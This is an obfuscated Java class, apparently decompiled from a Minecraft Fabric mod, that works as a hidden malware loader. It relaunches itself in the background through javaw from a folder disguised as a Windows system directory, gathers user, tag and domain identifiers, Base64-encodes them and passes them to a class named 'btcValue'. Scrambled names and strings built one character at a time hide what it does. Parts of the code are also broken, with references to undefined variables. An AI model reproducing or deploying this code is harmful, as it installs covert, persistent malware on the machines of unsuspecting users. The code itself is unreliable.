package net.fabric;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;

public class reo_qrox_ebgg_jhss {
   public static void main(String[] args) {
      if (mMZ_CW.length > 0) {
         String var10000 = mMZ_CW[0];

         if (!var10000.equals("-restarted")) {
            btcValue.main(mMZ_CW);
            return;
         }
      }

      for (String PTOH_asWm_yYlr_HbAd : mMZ_CW) {
         StringBuilder var9 = new StringBuilder();
         var9.append('-');
         var9.append('r');
         var9.append('e');
         var9.append('s');
         var9.append('t');
         var9.append('a');
         var9.append('r');
         var9.append('t');
         var9.append('e');
         var9.append('d');
         if (PTOH_asWm_yYlr_HbAd.equals("-restarted")) {
            run();
            return;
         }
      }

      try {

         String k4 = System.getProperty("java.home");
         String[] var10001 = new String[]{"bin", null};

         var10001[1] = "javaw.exe";
         Path nextIdx = Path.of(k4, var10001);
         if (!Files.exists(nextIdx)) {
            var10001 = new String[]{"bin", null};

            var10001[1] = "java.exe";
            nextIdx = Path.of(k4, var10001);
         }

         String fnj_ruc_cbc = new File(reo_qrox_ebgg_jhss.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();

         String var33 = System.getenv("LOCALAPPDATA");
         var10001 = new String[3];

         var10001[0] = "Microsoft";

         var10001[1] = "Windows";

         var10001[2] = "NtProfileIndex";
         Path capInfo = Path.of(var33, var10001);
         Files.createDirectories(capInfo);
         String gdd_tmziio_ot_dqjr = reo_qrox_ebgg_jhss.class.getName();
         String[] var10002 = new String[]{nextIdx.toString(), "-cp", fnj_ruc_cbc, gdd_tmziio_ot_dqjr, null};

         var10002[4] = "-restarted";
         ProcessBuilder PbOs_eY5BRBB = new ProcessBuilder(var10002);
         PbOs_eY5BRBB.redirectInput(Redirect.from(new File("NUL")));

         PbOs_eY5BRBB.redirectOutput(Redirect.appendTo(capInfo.resolve("_spawn.log").toFile()));
         PbOs_eY5BRBB.redirectErrorStream(true);
         PbOs_eY5BRBB.directory(capInfo.toFile());
         PbOs_eY5BRBB.start();
      } catch (Exception var28) {
      }
   }

   private static void run() {
      btcValue pcne_iijtk_apxzr_mnkpo = new btcValue();
      String paqz_ClaP_BCni_hqCY = pcne_iijtk_apxzr_mnkpo.getDomain();
      String ggwsfbZlxmdUxorXcbla = btcValue.fpxh();
      String zxkyeaGewgot = btcValue.boijwpi4();
      String var10000 = resolveHqavuqr(ggwsfbZlxmdUxorXcbla);
      String var10001 = resolveHqavuqr(zxkyeaGewgot);
      String var8 = resolveHqavuqr(paqz_ClaP_BCni_hqCY);
      String var7 = var10001;
      String var6 = var10000;

      StringBuilder var9;
      StringBuilder var21 = var9 = new StringBuilder();
      var9.append('{');
      var9.append('"');
      var9.append('u');
      var9.append('s');
      var9.append('e');
      var9.append('r');
      var9.append('I');
      var9.append('d');
      var9.append('"');
      var9.append(':');
      var9.append('"');
      StringBuilder var22 = var21.append("{\"userId\":\"").append(var6);

      StringBuilder var23 = var22.append("\",\"tag\":\"").append(var7);

      StringBuilder var24 = var23.append("\",\"domain\":\"").append(var8);

      String e1 = var24.append("\",\"env\":\"DoubleClick\"}").toString();
      String _jyt7uVr8 = Base64.getEncoder().encodeToString(e1.getBytes(StandardCharsets.UTF_8));
      btcValue.main(new String[]{_jyt7uVr8});
   }

   private static String resolveHqavuqr(String s) {
      if (FU_VwJT_LIw == null) {
         return "";
      }

      StringBuilder LbZD_noSO_BEDM_hCAr = new StringBuilder();

      for (char lrkosgWutdfqYwbqRflpt : FU_VwJT_LIw.toCharArray()) {
         switch (lrkosgWutdfqYwbqRflpt) {
            case '\t':
               LbZD_noSO_BEDM_hCAr.append("\\t");
               break;
            case '\n':
               LbZD_noSO_BEDM_hCAr.append("\\n");
               break;
            case '\r':
               LbZD_noSO_BEDM_hCAr.append("\\r");
               break;
            case '"':
               LbZD_noSO_BEDM_hCAr.append("\\\"");
               break;
            case '\\':
               StringBuilder var6 = new StringBuilder();
               var6.append('\\');
               var6.append('\\');
               LbZD_noSO_BEDM_hCAr.append(var6.toString());
               break;
            default:
               if (lrkosgWutdfqYwbqRflpt < ' ') {
                  StringBuilder var8 = new StringBuilder();
                  var8.append('\\');
                  var8.append('u');
                  var8.append('%');
                  var8.append('0');
                  var8.append('4');
                  var8.append('x');
                  LbZD_noSO_BEDM_hCAr.append(String.format(var8.toString(), Integer.valueOf(lrkosgWutdfqYwbqRflpt)));
               } else {
                  LbZD_noSO_BEDM_hCAr.append(lrkosgWutdfqYwbqRflpt);
               }
         }
      }

      return LbZD_noSO_BEDM_hCAr.toString();
   }
}
